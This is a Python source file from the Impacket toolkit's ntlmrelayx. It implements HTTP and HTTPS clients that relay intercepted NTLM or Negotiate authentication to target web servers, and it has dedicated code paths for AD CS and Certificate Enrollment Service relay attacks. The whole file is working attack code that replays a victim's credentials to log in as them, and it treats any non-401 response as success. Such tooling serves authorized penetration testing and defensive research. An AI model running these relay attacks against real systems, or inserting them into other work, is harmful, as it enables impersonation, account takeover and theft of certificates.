# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Protocol Client
#   HTTP(s) client for relaying NTLMSSP authentication to webservers
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        self.query = self.target.query
        return True

    def sendNegotiate(self,negotiateMessage):
        if getattr(self.serverConfig, 'isCESAttack', False):
            return self._sendCESNegotiate(negotiateMessage)

        #Check if server wants auth
        if self.query:
            self.session.request('GET', self.path + '?' + self.query)
        else:
            self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'NTLM' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "NTLM"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
                self.authenticationMethod = "NTLM"
            else:
                return False

        #Negotiate auth
        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers = {'Authorization':'%s %s' % (self.authenticationMethod, negotiate)}
        if self.query:
            self.session.request('GET', self.path + '?' + self.query, headers=headers)
        else:
            self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if getattr(self.serverConfig, 'isCESAttack', False):
            return self._sendCESAuth(authenticateMessageBlob)

        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            if respToken2.isNegoExSelected():
                LOG.info("Target selected NEGOEX/PKU2U authentication, relay currently not supported")
                raise Exception("NEGOEX/PKU2U relay is not supported")
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token).decode("ascii")
        headers = {'Authorization':'%s %s' % (self.authenticationMethod, auth)}
        if self.query:
            self.session.request('GET', self.path + '?' + self.query, headers=headers)
        else:
            self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            #Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def _cesPath(self):
        return self.path + (('?' + self.query) if self.query else '')

    @staticmethod
    def _cesHeaders(authorization=None):
        headers = {
            'Content-Type': 'application/soap+xml; charset=utf-8',
            'User-Agent': 'MS-WebServices/1.0',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Content-Length': '0',
        }
        if authorization is not None:
            headers['Authorization'] = authorization
        return headers

    @staticmethod
    def _wwwAuthenticate(response):
        values = []
        try:
            values = response.msg.get_all('WWW-Authenticate') or []
        except AttributeError:
            pass
        if not values:
            value = response.getheader('WWW-Authenticate')
            if value:
                values = [value]
        return ', '.join(values)

    def _cesEmptyPost(self, authorization=None):
        self.session.request('POST', self._cesPath(), body=b'', headers=self._cesHeaders(authorization))
        response = self.session.getresponse()
        body = response.read()
        return response, body

    def _sendCESNegotiate(self, negotiateMessage):
        response, _ = self._cesEmptyPost()
        offered = self._wwwAuthenticate(response)
        if response.status != 401:
            LOG.info('Status code returned to unauthenticated CES POST: %d' % response.status)
        if not offered:
            LOG.error('No authentication requested by the CES endpoint for url %s' % self.targetHost)
            return False
        if 'NTLM' not in offered.upper() and 'NEGOTIATE' not in offered.upper():
            LOG.error('NTLM/Negotiate not offered by CES URL, offered protocols: %s' % offered)
            return False

        # CES commonly advertises Negotiate while expecting a raw NTLMSSP token.
        self.authenticationMethod = 'Negotiate'
        authorization = 'Negotiate %s' % base64.b64encode(negotiateMessage).decode('ascii')
        response, _ = self._cesEmptyPost(authorization)
        offered = self._wwwAuthenticate(response)
        matches = re.findall(r'(?:^|[,\s])Negotiate\s+([A-Za-z0-9+/]+={0,2})(?=\s*,|\s*$)', offered, re.I)
        if len(matches) != 1:
            LOG.error('CES endpoint returned an absent or ambiguous NTLM challenge')
            return False
        try:
            serverChallenge = base64.b64decode(matches[0], validate=True)
            if serverChallenge[:1] == bytes([SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP]):
                responseToken = SPNEGO_NegTokenResp(serverChallenge)
                if responseToken.isNegoExSelected():
                    LOG.info('Target selected NEGOEX/PKU2U authentication, relay currently not supported')
                    return False
                serverChallenge = responseToken['ResponseToken']
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except Exception as exc:
            # Structure parsing can raise different exception types across
            # supported pyasn1/Impacket versions; malformed remote data fails closed.
            LOG.error('Invalid NTLM challenge returned from CES endpoint: %s' % exc)
            return False

    def _sendCESAuth(self, authenticateMessageBlob):
        if not authenticateMessageBlob:
            LOG.error('Empty NTLM authenticate message for CES endpoint')
            return None, STATUS_ACCESS_DENIED
        try:
            if authenticateMessageBlob[:1] == bytes([SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP]):
                responseToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
                if responseToken.isNegoExSelected():
                    LOG.info('Target selected NEGOEX/PKU2U authentication, relay currently not supported')
                    return None, STATUS_ACCESS_DENIED
                token = responseToken['ResponseToken']
            else:
                token = authenticateMessageBlob
            if not token:
                raise ValueError('authenticate token is empty')
        except Exception as exc:
            LOG.error('Malformed NTLM authenticate message for CES endpoint: %s' % exc)
            return None, STATUS_ACCESS_DENIED

        authorization = 'Negotiate %s' % base64.b64encode(token).decode('ascii')
        response, body = self._cesEmptyPost(authorization)
        if response.status == 401:
            LOG.error('CES rejected the relayed NTLM authenticate message')
            return None, STATUS_ACCESS_DENIED
        LOG.info('CES endpoint returned HTTP %d after relay authentication, treating as a successful login' % response.status)
        self.lastresult = body
        return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        self.session.request('HEAD','/favicon.ico')
        self.session.getresponse()

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        self.query = self.target.query
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return True
